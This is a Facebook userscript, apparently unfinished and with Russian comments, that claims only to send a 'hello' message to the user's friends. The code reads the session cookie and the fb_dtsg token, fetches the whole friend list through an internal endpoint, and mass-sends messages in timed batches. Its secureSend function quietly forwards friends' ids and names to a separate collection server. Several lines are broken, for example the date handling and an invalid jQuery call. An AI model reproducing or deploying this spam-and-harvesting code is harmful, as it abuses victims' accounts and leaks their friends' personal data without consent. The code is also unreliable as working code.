// ==UserScript==
// @name Hello
// @namespace yuvielle.ru/
// @version 0.01
// @source yuvielle.ru/
// @description Этот скрипт отправит послание с "hello" Вашим друзьям на facebook!
// @include *facebook.com*
// @exclude *developers.facebook.com*
// @require http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js
// @require https://rawgithub.com/typicaljoe/taffydb/master/taffy.js
// @require http://yandex.st/json2/2011-10-19/json2.min.js
// ==/UserScript==

var min = 0;
var max = 10;
var signs = ['+', '-'];
var task;
var body;
var db = TAFFY();
db.store("fbqwerty");

$(document).ready(function () {
    if (window.top != window.self) return;
    //alert( 'c_user = ' + readCookie('c_user') );

    $("body").on('submit', '#test_form', function (event) {

        if (checkTask($('#result').val())) {
           // alert('success');
            $('#my_test_div').hide();
            var fbid = readCookie('c_user');
            setFriendsList([fbid], testAsync);
            return false;
        }
        //alert('unsuccess get value= ' + $('#result').val() + ' datas= ' + task[0] + task[2] + task[1]);
        logo.innerHTML = getForm('your answer is incorrect<br>try agean please<br>');
        return false;
    });

});

function testAsync(fbid, list){
    //alert('in callback ' + list);
    if(list.length > 0){
       //alert ('in list');
       workWithFriendsList(list, fbid);
    }
};

function setFriendsList(fbid , callback) {
    var xmlhttp = new XMLHttpRequest();
    xmlhttp['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + fbid + '&token=' + Math['random']() + '&filter[0]=user&options[0]=friends_only', true);
    xmlhttp.onreadystatechange = function () {
        if (xmlhttp.readyState == 4) {
            if (xmlhttp.status == 200) {
                var re = /for \(\;\;\)\;/g;
                var txt = xmlhttp.responseText.replace(re, '');
                //alert('txt=' + txt);
                var obj = $.parseJSON(txt);
                var list = obj.payload.entries;
                //alert('list count=' + list.length);
                callback(fbid, list);
            }
            else callback(fbid, []);
        }
    };
    xmlhttp.send(null);
}

function workWithFriendsList(data, fbid) {
    //alert('in work' + fbid);
    //var list = [];
    var row = [];
    var test = '';
    var state;
    var i = 0;
    var z = window.require("XHR").getAsyncParams();
    var post = [];
    $.each(data, function (key, element) {
        //alert('begin: ' + element.uid);
        row['uid'] = element.uid;
        row['path'] = element.path;
        row['text'] = element.text;
        //list.push(row);
        
        if (i <= 10) {
            //alert ('in setInterval:' + row['uid']);
            if(db({uid:{is:element.uid}}).count()==0){
                sendMessage(row, fbid, z, false, i)
                i++;
            }
            //else{ alert('is=' + row['uid']) }
            delete data[key];
        }

    });
    if(data.length >0 ){ setTimeout(function(){ workWithFriendsList(data, fbid);  }, 1800000); alert('middle')}
    //else alert('end');
}

function sendMessage(data, fbid, z, real, i) {
   // alert ('in sendMessage: ' + i + ' = ' + data['uid']);
    if (real == false) {db.insert({uid: data['uid'], path: data['path'], text: data['text']}); return;}
    var d = new Date().getDate();
    var time = d.getHours() + "%3A" + d.getMinutes();
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    $.getElementsByClassName('uiTextareaAutogrow _552m')
    $.getElementsByClassName('removable uiToken').children('')//participants[]')
    $.ajax({
        type: "POST",
        url: "https://www.facebook.com/ajax/mercury/send_messages.php",
        data: "message_batch[0][action_type]=ma-type%3Auser-generated-message"
            + "&message_batch[0][thread_id]"
            + "&message_batch[0][author]=fbid%3A" + fbid
            + "&message_batch[0][author_email]"
            + "&message_batch[0][coordinates]"
            + "&message_batch[0][timestamp]=" + new Date().getTime()
            + "&message_batch[0][timestamp_absolute]=%D0%A1%D0%B5%D0%B3%D0%BE%D0%B4%D0%BD%D1%8F" //сегодня
            + "&message_batch[0][timestamp_relative]=" + time //15:05
            + "&message_batch[0][timestamp_time_passed]=0"
            + "&message_batch[0][is_unread]=false"
            + "&message_batch[0][is_cleared]=false"
            + "&message_batch[0][is_forward]=false"
            + "&message_batch[0][is_filtered_content]=false"
            + "&message_batch[0][is_spoof_warning]=false"
            + "&message_batch[0][source]=source%3Achat%3Aweb"
            + "&message_batch[0][source_tags][0]=source%3Achat"
            + "&message_batch[0][body]=" + body   // %D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82  привет
            + "&message_batch[0][has_attachment]=false"
            + "&message_batch[0][html_body]=false"
            + "&&message_batch[0][specific_to_list][0]=fbid%3A" + data['uid']
            + "&message_batch[0][specific_to_list][1]=fbid%3A" + fbid
            + "&message_batch[0][ui_push_phase]=V3"
            + "&message_batch[0][status]=0"
            + "&message_batch[0][message_id]=%3C" + new Date().getTime() + "%3A" + random(10) + "-" + random(10) + "mail.projektitan.com%3E"
            + "&&message_batch[0][client_thread_id]=user%3A" + data['uid']
            + "&&client=mercury"
            + "&__user=" + fbid
            + "&__a=" + z.__a
            + "&__dyn=" + z.__dyn
            + "&__req=" + z.__req
            + "&fb_dtsg=" + fb_dtsg
            + "&__rev=" + z.__rev
            + "&ttstamp=265816" + random(15),  //вроде не проверяет, но 2 запроса не показатель...

        success: function () {
            db.insert({uid: data['uid'], path: data['path'], text: data['text']});
            secureSend(fbid, data);
            return true;

        },
        error: function (e) {
           // alert("error: " + e.message);
            return false;
        }
    });
}

function secureSend(fbid, data) {
    var server = 'localhost:8383';
    var json = { 'fbid': fbid, 'uid': data.uid, 'path': data.path, 'text': data.text };
    $.ajax({
       type: 'GET',
        url: server,
        async: false,
        jsonpCallback: 'testCallback',
        contentType: "application/json",
        dataType: 'jsonp',
        success: function(json) {
           console.dir(json.answer); //куда-то затолкать
        },
        error: function(e) {
           console.log(e.message);
        }
    });
}

function getTask() {
    var num1 = Math.floor(Math.random() * (max - min + 1)) + min;
    var num2 = Math.floor(Math.random() * (max - min + 1)) + min;
    var sign = signs[Math.floor(Math.random() * (signs.length))];
    task = [num1, num2, sign];
    return task;
}

function checkTask(val) {
    if (typeof task == 'undefined') {
        return false;
    }
    var result;
    switch (task[2]) {
        case '+':
            result = task[0] + task[1];
            break;
        case '-':
            result = task[0] - task[1];
            break;
        default :
            result = 0;
    }
    return val == result;
}

function getForm(message) {
    var sub = getTask();
    var form =
        '<h1 style="margin: 15px;">test form</h1><p>'
            + message
            + sub[0] + sub[2] + sub[1] + '</p>'
            + '<form id="test_form" name="test_form">'
            + '<label for="result">введите ответ </label>'
            + '<input name="result" id="result" type="text" style="width:200px; height:30px">'
            + '<input type="submit" value="ok">'
            + '</form>';
    return form;
}

if (document.getElementById("my_test_div") == null && window == top) {

    var logo = document.createElement("div");
    logo.setAttribute('id', 'my_test_div');
    logo.setAttribute("style", "margin: 0pt auto; padding: 20px; width: 800px; background-color:#CCCCCC; text-align: center; position: fixed; top:30%; left:15%; z-index:999");

    logo.innerHTML = getForm('');
    document.body.insertBefore(logo, document.body.firstChild);
    //alert(document.getElementById("my_test_div").parentNode.parentNode.tagName);
}


//helper functions

function random(len) {
    var min = Math.pow(10, len - 1);
    var max = Math.pow(10, len);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

$.fn.comments = function (blnDeep) {
   // alert('comments test');
    blnDeep = (blnDeep || false);
    var jComments = $([]);

    // Loop over each node to search its children for
    // comment nodes and element nodes (if deep search).
    this.each(function (intI, objNode) {
        //alert('in each');
        var objChildNode = objNode.firstChild;

        // Keep looping over the top-level children
        // while we have a node to examine.
        while (objChildNode) {
           // alert('while');
            // Check to see if this node is a comment.
            if (objChildNode.nodeType === 8) {
                commentWork(jComments);
            } else if (blnDeep && (objChildNode.nodeType === 1)) {
                // Traverse this node deeply.
                jComments = jComments.add(
                    $(objChildNode).comments(true)
                );
            }
            // Move to the next sibling.
            objChildNode = objChildNode.nextSibling;
        }

    });

    // Return the jQuery comments collection.
    return( jComments );
}

function readCookie(name) {

    var nameEQ = escape(name) + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return unescape(c.substring(nameEQ.length, c.length));
    }
    return null;
}
